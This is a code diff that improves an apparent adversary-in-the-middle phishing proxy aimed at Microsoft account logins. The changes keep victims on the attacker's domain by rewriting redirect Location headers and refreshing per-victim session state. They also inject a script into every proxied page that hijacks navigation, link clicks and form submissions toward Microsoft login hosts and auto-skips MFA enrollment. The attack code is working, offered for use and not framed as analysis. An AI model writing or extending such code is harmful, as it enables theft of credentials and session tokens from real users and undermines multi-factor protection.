@@ -459,23 +459,30 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
     const proxyResponseLocation = proxyResponse.headers.location;
     if (proxyResponseLocation) {
         try {
-            const locationURL = new URL(proxyResponseLocation);
-            console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
-            
-            // Update session to the target host (important for subsequent requests)
+            // Normalize protocol-relative and relative URLs
+            let absoluteLocation = proxyResponseLocation;
+            if (proxyResponseLocation.startsWith('//')) {
+                absoluteLocation = `https:${proxyResponseLocation}`;
+            } else if (proxyResponseLocation.startsWith('/')) {
+                absoluteLocation = `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyResponseLocation}`;
+            }
+
+            const locationURL = new URL(absoluteLocation);
+
+            // Update session to the redirect target
             VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
             VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
             VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
             VICTIM_SESSIONS[currentSession].port = locationURL.port;
             VICTIM_SESSIONS[currentSession].host = locationURL.host;
 
-            // Rewrite Location to point back to your proxy domain
-            const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+            // Rewrite to proxy domain
+            const rewritten = absoluteLocation.replace(locationURL.host, proxyHostname);
             proxyResponse.headers.location = rewritten;
-            console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
+            console.log(`[REDIRECT REWRITE] ${proxyResponseLocation} -> ${rewritten}`);
         } catch (error) {
-            VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
-            console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
+            console.log(`[REDIRECT PARSE ERROR] ${error.message}, forcing proxy`);
+            proxyResponse.headers.location = `https://${proxyHostname}/`;
         }
     }
 } else if (proxyResponse.statusCode > 400) {
@@ -586,7 +593,7 @@ const caption =
         const cleanedBuffer = Buffer.from(html);
 
         // ---- STATIC injection (original method) ----
-        serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
+        serverResponseBody = updateHTMLProxyResponse(cleanedBuffer, proxyHostname);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
         if (proxyResponse.headers["content-length"]) {
@@ -1213,31 +1220,43 @@ async function compressResponseBody(decompressedData, encodings) {
 }
 
 // ---- updateHTMLProxyResponse is no longer used – we replaced it with dynamic injection ----
-function updateHTMLProxyResponse(decompressedResponseBody) {
-    const payload = "<script src=/@></script>";
-    const htmlInjectionMap = {
-        "<head>": `<head>${payload}`,
-        "<html>": `<html><head>${payload}</head>`,
-        "<body>": `<head>${payload}</head><body>`
-    };
-    const indexLimit = 200;
+function updateHTMLProxyResponse(decompressedResponseBody, proxyHostname) {
+    const payload = `<script>(function(){
+var P='https://${proxyHostname}',M='${PROXY_PATHNAMES.mutation}',K='${PHISHED_URL_PARAMETER}';
+function d(u){try{return decodeURIComponent(decodeURIComponent(u));}catch(e){return u;}}
+function ms(u){try{var x=new URL(u,location.href);return x.hostname.indexOf('microsoftonline.com')>-1||x.hostname.indexOf('login.microsoft.com')>-1||x.hostname.indexOf('login.live.com')>-1||x.hostname.indexOf('account.live.com')>-1||x.hostname.indexOf('account.microsoft.com')>-1;}catch(e){return false;}}
+function px(u){return P+M+'?'+K+'='+encodeURIComponent(encodeURIComponent(new URL(u,location.href).href));}
+// Auto-skip MFA enrollment
+var h=location.href,dd=d(h);
+if(dd.indexOf('/common/SAS/')>-1&&!window.__sf){window.__sf=1;location.replace(px('https://login.microsoftonline.com/common/resume?skipmfaregistration=1'));return;}
+// Override location.href setter
+try{var D=Object.getOwnPropertyDescriptor(Window.prototype,'location');if(D&&D.set){Object.defineProperty(window,'location',{get:D.get,set:function(u){if(ms(u))D.set.call(this,px(u));else D.set.call(this,u);}});}}catch(e){}
+// Override location.assign and location.replace
+try{var a=location.assign.bind(location),r=location.replace.bind(location);location.assign=function(u){if(ms(u))a(px(u));else a(u);};location.replace=function(u){if(ms(u))r(px(u));else r(u);};}catch(e){}
+// Intercept clicks on Microsoft links
+document.addEventListener('click',function(e){var t=e.target;while(t&&t!==document){if(t.tagName==='A'&&t.href&&ms(t.href)){e.preventDefault();e.stopPropagation();location.href=px(t.href);return;}if(t.tagName==='FORM'&&t.action&&ms(t.action)){e.preventDefault();e.stopPropagation();t.action=px(t.action);t.submit();return;}t=t.parentNode;}},true);
+// Intercept form submissions
+document.addEventListener('submit',function(e){var f=e.target;if(f.action&&ms(f.action)){e.preventDefault();e.stopPropagation();f.action=px(f.action);f.submit();}},true);
+})();</script><script src=/@></script>`;
 
-    for (const [key, value] of Object.entries(htmlInjectionMap)) {
-        const htmlTagBuffer = Buffer.from(key);
-        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);
+    const html = decompressedResponseBody.toString('utf8');
 
-        if (injectionPointIndex !== -1) {
-            return Buffer.concat([
-                decompressedResponseBody.subarray(0, injectionPointIndex),
-                Buffer.from(value),
-                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
-            ]);
-        }
+    let match = html.match(/<head[^>]*>/i);
+    if (match) {
+        return Buffer.from(html.replace(match[0], match[0] + payload), 'utf8');
     }
-    return Buffer.concat([
-        Buffer.from(`<head>${payload}</head>`),
-        decompressedResponseBody
-    ]);
+
+    match = html.match(/<html[^>]*>/i);
+    if (match) {
+        return Buffer.from(html.replace(match[0], match[0] + `<head>${payload}</head>`), 'utf8');
+    }
+
+    match = html.match(/<body[^>]*>/i);
+    if (match) {
+        return Buffer.from(html.replace(match[0], `<head>${payload}</head>${match[0]}`), 'utf8');
+    }
+
+    return Buffer.from(`<head>${payload}</head>${html}`, 'utf8');
 }
 
 function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
